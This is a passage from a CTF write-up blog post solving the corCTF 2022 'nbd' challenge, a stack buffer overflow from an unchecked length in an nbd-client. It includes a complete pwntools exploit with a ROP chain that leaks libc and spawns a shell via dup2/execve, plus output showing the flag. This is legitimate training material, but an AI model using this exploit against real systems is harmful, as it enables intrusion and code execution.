</span></span><span style="display:flex;"><span>					printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">while</span>(reptype <span style="color:#f92672">!=</span> NBD_REP_ACK);
</span></span><span style="display:flex;"><span>	send_request(sock, NBD_OPT_ABORT, <span style="color:#ae81ff">0</span>, NULL);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>len</code> has <code>uint32_t</code> data type, so it&rsquo;s always greater than 0. There&rsquo;s also no check for <code>len</code> and it is a controllable variable. Basically we have a stack buffer overflow here.</p>
<p>Because the binary has no PIE, it becomes a normal rop challenge.</p>
<p><code>ask_list</code> gets called inside <code>negotiate</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">negotiate</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>sockp, u64 <span style="color:#f92672">*</span>rsize64, <span style="color:#66d9ef">uint16_t</span> <span style="color:#f92672">*</span>flags, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> name, <span style="color:#66d9ef">uint32_t</span> needed_flags, <span style="color:#66d9ef">uint32_t</span> client_flags, <span style="color:#66d9ef">uint32_t</span> do_opts, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>certfile, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>keyfile, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cacertfile, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tlshostname, <span style="color:#66d9ef">bool</span> tls, <span style="color:#66d9ef">bool</span> can_opt_go) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(do_opts <span style="color:#f92672">&amp;</span> NBDC_DO_LIST) {
</span></span><span style="display:flex;"><span>		ask_list(sock);
</span></span><span style="display:flex;"><span>		exit(EXIT_SUCCESS);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>and <code>negotiate</code> is called here in main:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>preinit)
</span></span><span style="display:flex;"><span>			negotiate(<span style="color:#f92672">&amp;</span>sock, <span style="color:#f92672">&amp;</span>size64, <span style="color:#f92672">&amp;</span>flags, name, needed_flags, cflags, opts, certfile, keyfile, cacertfile, tlshostname, tls, can_opt_go);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Inside <code>negotiate</code> function, we need to bypass some checks:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;Negotiation: &#34;</span>);
</span></span><span style="display:flex;"><span>	readit(sock, buf, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (strcmp(buf, INIT_PASSWD))			<span style="color:#75715e">// INIT_PASSWD is &#34;NBDMAGIC&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		err(<span style="color:#e6db74">&#34;INIT_PASSWD bad&#34;</span>);
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>	readit(sock, <span style="color:#f92672">&amp;</span>tmp, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint16_t</span>));
</span></span><span style="display:flex;"><span>	global_flags <span style="color:#f92672">=</span> ntohs(tmp);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>((needed_flags <span style="color:#f92672">&amp;</span> global_flags) <span style="color:#f92672">!=</span> needed_flags) {				<span style="color:#75715e">// need to pass this check too
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">/* There&#39;s currently really only one reason why this
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * check could possibly fail, but we may need to change
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * this error message in the future... */</span>
</span></span><span style="display:flex;"><span>		fprintf(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">E: Server does not support listing exports</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span></code></pre></div><p>And some more checks inside <code>ask_list</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(magic <span style="color:#f92672">!=</span> rep_magic) {
</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#34;Not enough magic from server&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(reptype <span style="color:#f92672">&amp;</span> NBD_REP_FLAG_ERROR) {			<span style="color:#75715e">// We don&#39;t want to go into this if branch
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		...
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>(reptype <span style="color:#f92672">!=</span> NBD_REP_SERVER) 			<span style="color:#75715e">// reptype should be equal to NBD_REP_SERVER
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				err(<span style="color:#e6db74">&#34;Server sent us a reply we don&#39;t understand!&#34;</span>);
</span></span><span style="display:flex;"><span>			}
</span></span></code></pre></div><p>For the ropchain, I use write syscall to leak libc, and finally use dup2/execve to spawn a shell.</p>
<h2 id="final-script-1">Final script:<a hidden class="anchor" aria-hidden="true" href="#final-script-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./nbd-client&#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;nc&#39;</span>, <span style="color:#e6db74">&#39;-lnvp&#39;</span>, <span style="color:#e6db74">&#39;9999&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;NBDMAGIC&#39;</span>)                     <span style="color:#75715e"># INIT_PASSWD</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;IHAVEOPT&#39;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01</span><span style="color:#e6db74">&#39;</span>)                     <span style="color:#75715e"># tmp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(p64(<span style="color:#ae81ff">0xa965550489e80300</span>))         <span style="color:#75715e"># rep_magic</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)                          <span style="color:#75715e"># opt_server</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00\x02</span><span style="color:#e6db74">&#39;</span>)             <span style="color:#75715e"># reptype</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x10\x00</span><span style="color:#e6db74">&#39;</span>)             <span style="color:#75715e"># len</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x01\x00</span><span style="color:#e6db74">&#39;</span>)             <span style="color:#75715e"># lenn</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x402b56</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40419d</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x424</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;write&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00404360</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;read&#39;</span>]
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x36174</span>
</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x142c92</span>
</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x630a9</span>
</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(p64(<span style="color:#ae81ff">0xa965550489e80300</span>))         <span style="color:#75715e"># rep_magic</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)                          <span style="color:#75715e"># opt_server</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00\x02</span><span style="color:#e6db74">&#39;</span>)             <span style="color:#75715e"># reptype</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x10\x00</span><span style="color:#e6db74">&#39;</span>)             <span style="color:#75715e"># len</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x01\x00</span><span style="color:#e6db74">&#39;</span>)             <span style="color:#75715e"># lenn</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x424</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">33</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">33</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">33</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(bin_sh)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3b</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 solve.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/pivik/CTF/2022/cor/pwn/nbd/nbd-client&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x3ff000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    FORTIFY:  Enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/pivik/CTF/2022/cor/pwn/nbd/libc-2.31.so&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/usr/bin/nc&#39;</span>: pid <span style="color:#ae81ff">8951</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Paused <span style="color:#f92672">(</span>press any to <span style="color:#66d9ef">continue</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x7f2eaaec2000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>flag.txt
</span></span><span style="display:flex;"><span>nbd-client
</span></span><span style="display:flex;"><span>serv.py
</span></span><span style="display:flex;"><span>$ cat flag.txt
</span></span><span style="display:flex;"><span>corctf<span style="color:#f92672">{</span>ch3cK-y0UR_v4R14Bl3$!!11!111<span style="color:#f92672">}</span>
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://pivik271.github.io/posts/ascisquals2022/">
    <span class="title">« Prev</span>
    <br>
    <span>Sơ khảo Sinh viên với An toàn thông tin 2022</span>
  </a>
  <a class="next" href="https://pivik271.github.io/posts/googlectf2022/">
    <span class="title">Next »</span>
    <br>
    <span>Google CTF - Madcore, Fixedaslr</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://pivik271.github.io/">pivik</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
